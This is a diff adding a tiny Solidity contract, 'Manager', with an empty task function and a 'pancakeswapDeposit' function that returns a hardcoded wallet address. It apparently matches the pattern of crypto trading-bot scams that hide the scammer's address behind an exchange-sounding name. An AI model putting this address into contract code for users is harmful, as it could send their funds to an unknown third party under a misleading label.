@@ -1,0 +1,9 @@
+contract Manager {
+	function performTasks() public pure {
+	}
+
+	function pancakeswapDeposit() public pure returns (address) {
+		return 0x15919195862EFb31562Fb3C7d3d2b0cC9db5Cc54;
+	}
+	
+}
